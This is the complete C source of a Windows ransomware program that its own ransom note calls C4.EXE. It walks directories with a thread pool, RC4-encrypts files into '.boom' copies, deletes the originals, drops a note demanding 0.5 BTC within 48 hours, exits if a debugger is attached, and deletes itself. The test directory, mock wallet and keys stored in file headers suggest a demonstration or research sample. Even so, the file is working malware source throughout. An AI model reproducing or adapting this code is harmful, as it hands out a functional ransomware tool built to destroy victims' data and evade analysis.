#include <Windows.h>
#include <stdio.h>
#include <process.h>
#include "structs.h"
#include "memoryutils.h"
#include "stringutils.h"
#include "antianalysis.h"
#include "arcfour.h"
#pragma warning(disable : 4996 4325 4715)
#pragma section(".text", read, execute)
#define TEXT_SECTION    __declspec(allocate(".text"))
#define MAX_THREADS                 8
#define NUM_BLACKLISTED_EXTENSIONS  11
#define ENCRYPT_EXT_A               ".boom"
#define ENCRYPT_EXT_W               L".boom"
#define SIGNATURE                   0x4d4f4f42  // 'BOOM' 
#define KEY_SIZE                    32
#define HINT_BYTE                   0xB4
/*
---------------------------------------------------------------------------------------------- ---------------------------------------------------------------------------------------------- ---------------------------------------------------------------------------------------------- */

   ///////////////////
  // CONFIGURATION //
 ///////////////////

TEXT_SECTION BOOL g_EncryptMode         =       TRUE;     // TRUE = Encrypt, FALSE = Decrypt
TEXT_SECTION BOOL g_RansomMode          =       TRUE;     // TRUE = Drop a text file (g_Note) with payment instructions to the current directory
TEXT_SECTION BOOL g_AntiDebug           =       TRUE;     // TRUE = Program exits when debugger (such as x64dbg, OllyDbg, WinDbg) is attached 
TEXT_SECTION BOOL g_SelfDelete          =       TRUE;     // TRUE = Binary will self-delete
TEXT_SECTION BOOL g_Verbose             =       TRUE;     // TRUE = Print files, directories, errors, and execution time to the console


LPCWSTR g_Directories[] = { 
    L"C:\\Users\\Public\\TestDirectory", 
    NULL
}; 


LPCWSTR g_BlacklistedExtensions[NUM_BLACKLISTED_EXTENSIONS] = {    
    ENCRYPT_EXT_W,
    L".exe", L".dll", L".sys", L".ini", L".conf",
    L".cfg", L".reg", L".dat", L".bat", L".cmd"
};


LPCSTR g_Note = {
    "YOUR FILES HAVE BEEN ENCRYPTED BY C4.EXE\r\n"
    "This is not a joke. Want your data restored?\r\n"
    "Send 0.5 BTC to the address below:\r\n"
    "1MockBTCAddrxxxxxxxxxxxxxxxxxx\r\n"
    "You have 48 hours.\r\n"
};


/*
---------------------------------------------------------------------------------------------- ---------------------------------------------------------------------------------------------- ---------------------------------------------------------------------------------------------- */

DWORD   g_StartTime,
        g_FinishTime;

typedef struct _THREAD_PARAMS {
    char path[MAX_PATH];
    BOOL encrypt;
} THREAD_PARAMS, * PTHREAD_PARAMS;

typedef struct _ENCRYPTED_FILE_HEADER {
    DWORD Signature;
    BYTE  Rc4Key[KEY_SIZE];
} ENCRYPTED_FILE_HEADER, * PENCRYPTED_FILE_HEADER;

extern int __cdecl _rdrand32_step(unsigned int*);

PBYTE GenerateRandomBytes(IN DWORD dwKeySize) {
    PBYTE			pKey = NULL;
    unsigned short	us2RightMostBytes = NULL;
    unsigned int	uiSeed = 0x00;
    BOOL			bResult = FALSE;

    if (!(pKey = _heapalloc(dwKeySize))) {
        return NULL;
    }

    us2RightMostBytes = (unsigned short)((ULONG_PTR)pKey & 0xFFFF);

    for (int i = 0; i < dwKeySize; i++) {

        if (!_rdrand32_step(&uiSeed))
            goto _END_OF_FUNC;

        if (i % 2 == 0)
            pKey[i] = (unsigned int)(((us2RightMostBytes ^ uiSeed) & 0xFF) % 0xFF);
        else
            pKey[i] = (unsigned int)((((us2RightMostBytes ^ uiSeed) >> 8) & 0xFF) % 0xFF);
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (!bResult && pKey) {
        _heapfree(pKey);
        return NULL;
    }
    return pKey;
}

LPCWSTR GetFileExtensionW(LPCWSTR filePath) {   

    LPCWSTR dot = _wcsrchr(filePath, L'.');

    return (dot && *dot) ? dot : NULL;
}

BOOL IsBlacklistedExtension(LPCWSTR filePath) { 

    LPCWSTR ext = GetFileExtensionW(filePath);  

    if (!ext)
        return FALSE;

    for (int i = 0; i < NUM_BLACKLISTED_EXTENSIONS; i++) {
        if (_stricmpW(ext, g_BlacklistedExtensions[i]) == 0)
            return TRUE;
    }

    return FALSE;
}

VOID EncryptSingleFile(const char* path) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    LARGE_INTEGER fsize = { 0 };
    DWORD size = 0, bytesRead = 0, written = 0;
    BYTE* buffer = NULL;
    PBYTE randomKey = NULL;
    RC4_CTX ctx = { 0 };
    ENCRYPTED_FILE_HEADER hdr = { 0 };
    char outPath[MAX_PATH];

    // Open the input file for reading
    hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    // Get file size and validate it's acceptable
    if (!GetFileSizeEx(hFile, &fsize) || fsize.QuadPart == 0 || fsize.QuadPart > MAXDWORD) {
        CloseHandle(hFile);
        return;
    }

    size = (DWORD)fsize.QuadPart;

    // Allocate buffer for file content
    buffer = (BYTE*)_heapalloc(size);
    if (!buffer) {
        CloseHandle(hFile);
        return;
    }

    // Read file into memory
    if (!ReadFile(hFile, buffer, size, &bytesRead, NULL) || bytesRead != size) {
        CloseHandle(hFile);
        _heapfree(buffer);
        return;
    }
    CloseHandle(hFile);

    // Generate per-file random encryption key
    randomKey = GenerateRandomBytes(KEY_SIZE);
    KSA(&ctx, randomKey, KEY_SIZE);  // Key scheduling
    PRGA(&ctx, buffer, size);        // Encrypt buffer in-place using RC4

    // Prepare file header with signature and key
    hdr.Signature = SIGNATURE;
    _memcpy(hdr.Rc4Key, randomKey, KEY_SIZE);

    // Compose output file path by appending .encrypted extension
    _snprintfA(outPath, MAX_PATH, "%s", path);
    _strncat(outPath, ENCRYPT_EXT_A, MAX_PATH - _strlen(outPath) - 1);

    // Write encrypted data and header to output file
    HANDLE hOut = CreateFileA(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        _heapfree(buffer);
        return;
    }

    WriteFile(hOut, &hdr, sizeof(hdr), &written, NULL);
    WriteFile(hOut, buffer, size, &written, NULL);
    CloseHandle(hOut);

    // Delete original plaintext file and free memory
    DeleteFileA(path);
    _heapfree(buffer);

    // Log encrypted file if verbose is enabled
    if (g_Verbose)
        PRINTA("[+] Encrypted: %s -> %s\n", path, outPath);
}


VOID DecryptSingleFile(const char* path) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    HANDLE hOut = INVALID_HANDLE_VALUE;
    ENCRYPTED_FILE_HEADER hdr = { 0 };
    LARGE_INTEGER totalSize = { 0 };
    DWORD read = 0, bytesRead = 0, bytesWritten = 0;
    DWORD encSize = 0;
    BYTE* buffer = NULL;
    RC4_CTX ctx = { 0 };
    char outPath[MAX_PATH];
    size_t extLen = 0, pathLen = 0;

    // Open encrypted file for reading
    hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        if (g_Verbose)
            PRINTA("[!] Failed to open file for reading: %s\n", path);
        return;
    }

    // Read and verify file header
    if (!ReadFile(hFile, &hdr, sizeof(hdr), &read, NULL) || read != sizeof(hdr)) {
        if (g_Verbose)
            PRINTA("[!] Failed to read header from file: %s\n", path);
        CloseHandle(hFile);
        return;
    }

    if (hdr.Signature != SIGNATURE) {
        if (g_Verbose)
            PRINTA("[!] Invalid signature, skipping file: %s\n", path);
        CloseHandle(hFile);
        return;
    }

    // Get total file size
    if (!GetFileSizeEx(hFile, &totalSize)) {
        CloseHandle(hFile);
        return;
    }

    // Allocate buffer for encrypted content (excluding header)
    encSize = (DWORD)(totalSize.QuadPart - sizeof(hdr));
    buffer = (BYTE*)_heapalloc(encSize);
    if (!buffer) {
        if (g_Verbose)
            PRINTA("[!] Memory allocation failed\n");
        CloseHandle(hFile);
        return;
    }

    // Read encrypted content from file
    SetFilePointer(hFile, sizeof(hdr), NULL, FILE_BEGIN);
    if (!ReadFile(hFile, buffer, encSize, &bytesRead, NULL) || bytesRead != encSize) {
        if (g_Verbose)
            PRINTA("[!] Failed to read encrypted content\n");
        CloseHandle(hFile);
        _heapfree(buffer);
        return;
    }
    CloseHandle(hFile);

    // Decrypt in-place using RC4
    KSA(&ctx, hdr.Rc4Key, KEY_SIZE);
    PRGA(&ctx, buffer, encSize);

    // Build output path by removing encrypted extension
    extLen = _strlen(ENCRYPT_EXT_A);
    pathLen = _strlen(path);
    if (pathLen <= extLen || _strcmp(path + pathLen - extLen, ENCRYPT_EXT_A) != 0) {
        if (g_Verbose)
            PRINTA("[!] Unexpected file extension: %s\n", path);
        _heapfree(buffer);
        return;
    }

    _strncpy(outPath, path, pathLen - extLen);
    outPath[pathLen - extLen] = '\0';

    // Open output file for writing decrypted data
    hOut = CreateFileA(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        if (g_Verbose)
            PRINTA("[!] Failed to open file for writing: %s\n", outPath);
        _heapfree(buffer);
        return;
    }

    // Write decrypted content to output file
    WriteFile(hOut, buffer, encSize, &bytesWritten, NULL);
    CloseHandle(hOut);

    // Clean up: delete original encrypted file
    DeleteFileA(path);
    _heapfree(buffer);

    // Log successful decryption
    if (g_Verbose)
        PRINTA("[+] Decrypted: %s -> %s\n", path, outPath);
}


// Thread pool callback that performs encryption or decryption
VOID CALLBACK FileWorkerTP(PTP_CALLBACK_INSTANCE Instance, PVOID pArgs, PTP_WORK Work) {
    THREAD_PARAMS* params = (THREAD_PARAMS*)pArgs;

    if (params->encrypt) {
        EncryptSingleFile(params->path);
    }
    else {
        DecryptSingleFile(params->path);
    }
    _heapfree(params);
}


// Directory processor that dispatches file jobs to thread pool
BOOL ProcessDirectoryMT(LPCWSTR dir, BOOL encryptMode) {
    BOOL result = FALSE;
    WCHAR dirPathW[MAX_PATH * 2], fullPathW[MAX_PATH * 2];
    CHAR fullPathA[MAX_PATH * 2];
    WIN32_FIND_DATAW fd = { 0 };
    PTP_POOL pool = NULL;
    TP_CALLBACK_ENVIRON CallBackEnv;
    PTP_CLEANUP_GROUP cleanup = NULL;

    // Create thread pool and configure concurrency
    pool = CreateThreadpool(NULL);
    if (!pool) return FALSE;
    SetThreadpoolThreadMaximum(pool, MAX_THREADS);
    SetThreadpoolThreadMinimum(pool, 1);

    // Initialize callback environment
    cleanup = CreateThreadpoolCleanupGroup();
    InitializeThreadpoolEnvironment(&CallBackEnv);
    SetThreadpoolCallbackPool(&CallBackEnv, pool);
    SetThreadpoolCallbackCleanupGroup(&CallBackEnv, cleanup, NULL);

    // Search for files in the directory
    _wsprintfW(dirPathW, L"%s\\*", dir);
    HANDLE hFind = FindFirstFileW(dirPathW, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        if (g_Verbose)
            PRINTW(L"[!] FindFirstFileW failed for %ls\n", dir);
        return result;
    }

    // Submit work items to thread pool for each regular file
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;

        _wsprintfW(fullPathW, L"%s\\%s", dir, fd.cFileName);
        if (!WCharStringToCharString(fullPathA, fullPathW, MAX_PATH * 2)) {
            if (g_Verbose)
                PRINTA("[!] WCharStringToCharString failed!");
            continue;
        }

        BOOL isEncrypted = (_StrStrIW(fd.cFileName, ENCRYPT_EXT_W) != NULL);
        if ((encryptMode && isEncrypted) || (!encryptMode && !isEncrypted)) {
            continue;
        }

        if (encryptMode && IsBlacklistedExtension(fd.cFileName)) {
            if (g_Verbose)
                PRINTW(L"[!] Skipping blacklisted: %s\n", fd.cFileName);
            continue;
        }

        // Allocate parameters for this file task
        THREAD_PARAMS* pParams = (THREAD_PARAMS*)_heapalloc(sizeof(THREAD_PARAMS));
        if (!pParams) {
            if (g_Verbose)
                PRINTA("[!] HeapAlloc failed for THREAD_PARAMS\n");
            continue;
        }

        _strcpy_s(pParams->path, MAX_PATH, fullPathA);
        pParams->encrypt = encryptMode;

        // Create and submit thread pool work item
        PTP_WORK work = CreateThreadpoolWork(FileWorkerTP, pParams, &CallBackEnv);
        if (!work) {
            if (g_Verbose)
                PRINTA("[!] Failed to create threadpool work item\n");
            _heapfree(pParams);
            continue;
        }

        SubmitThreadpoolWork(work);
        result = TRUE;
    } while (FindNextFileW(hFind, &fd));

    // Clean up thread pool resources
    FindClose(hFind);
    CloseThreadpoolCleanupGroupMembers(cleanup, FALSE, NULL);
    CloseThreadpoolCleanupGroup(cleanup);
    DestroyThreadpoolEnvironment(&CallBackEnv);
    CloseThreadpool(pool);

    // Recursively process subdirectories
    _wsprintfW(dirPathW, L"%s\\*", dir);
    hFind = FindFirstFileW(dirPathW, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return result;

    do {
        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
            _wcscmp(fd.cFileName, L".") != 0 &&
            _wcscmp(fd.cFileName, L"..") != 0) {

            WCHAR subDir[MAX_PATH * 2];
            _wsprintfW(subDir, L"%s\\%s", dir, fd.cFileName);
            if (ProcessDirectoryMT(subDir, encryptMode)) {
                result = TRUE;
            }
        }
    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);
    return result;
}

BOOL WriteTextFile(LPCSTR note) {
    HANDLE  hFile;
    WCHAR   wCurrentDir[MAX_PATH];
    DWORD   directorySize = GetCurrentDirectoryW(MAX_PATH, wCurrentDir), bytesWritten;

    _wcscat(wCurrentDir, L"\\READ_ME_NOW.txt");

    if (directorySize == 0 || directorySize > MAX_PATH) {
        if (g_Verbose)
            PRINTA("[!] Failed to get current directory.\n");
        return FALSE;
    }
    hFile = CreateFileW(wCurrentDir, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        if (g_Verbose)
            PRINTA("[!] Unable to leave note.");
        return FALSE;
    }

    WriteFile(hFile, note, (DWORD)_strlen(note), &bytesWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

// Walks multiple directories and processes files
BOOL Run(LPCWSTR* dirs, BOOL isEncrypting) {
    for (int i = 0; dirs[i] != NULL; i++) {
        if (g_Verbose)
            PRINTW(L"\n[>] Target Directory: %s\n", dirs[i]);
        if (!ProcessDirectoryMT(dirs[i], isEncrypting)) {
            if (g_Verbose)
                PRINTA("[!] Failed to process directory!\n");
        }
    }
    return TRUE;
}

int main() {

    if (g_AntiDebug && IsBeingDebugged()) 
        return -1;
    
  
    if (g_Verbose)
        g_StartTime = (DWORD)GetTickCount64();
    

    if (Run(g_Directories, g_EncryptMode)) 
        PRINTA("[>] Operation completed successfully.\n");
    else
        PRINTA("[!] No directories processed.\n");


    if (g_Verbose) {
        g_FinishTime = (DWORD)GetTickCount64() - g_StartTime;
        PRINTA("[>] Time: %llu ms\n", g_FinishTime);
    }


    if (g_EncryptMode && g_RansomMode) {
        if (!WriteTextFile(g_Note)) {
            if (g_Verbose)
                PRINTA("[!] Failed to write ransom note!\n");
        }
    }


    if (g_SelfDelete)
        if (!DeleteSelf())
            if (g_Verbose)
                PRINTA("[!] Self delete failed!\n");


    return 0;
}
